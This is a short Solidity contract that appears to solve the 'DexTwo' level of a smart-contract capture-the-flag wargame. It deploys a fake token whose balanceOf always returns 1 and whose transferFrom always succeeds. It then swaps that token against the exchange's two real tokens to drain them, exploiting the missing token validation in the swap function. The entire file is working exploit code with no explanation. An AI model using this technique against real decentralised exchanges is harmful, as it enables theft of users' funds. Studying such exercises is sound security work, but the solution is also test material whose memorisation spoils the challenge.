// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./DexTwo.sol";

contract DexTwoHack {
    DexTwo dexTwo;
    constructor(DexTwo _dexTwo) {
        dexTwo = _dexTwo;
    }

    function balanceOf(address) public view returns(uint balance){
        balance = 1;
    }

    function transferFrom(address from, address to, uint amount) public returns(bool) {
        return true;
    }

    function attack() external {
        dexTwo.swap(address(this), dexTwo.token1(), 1);
        dexTwo.swap(address(this), dexTwo.token2(), 1);
    }
}
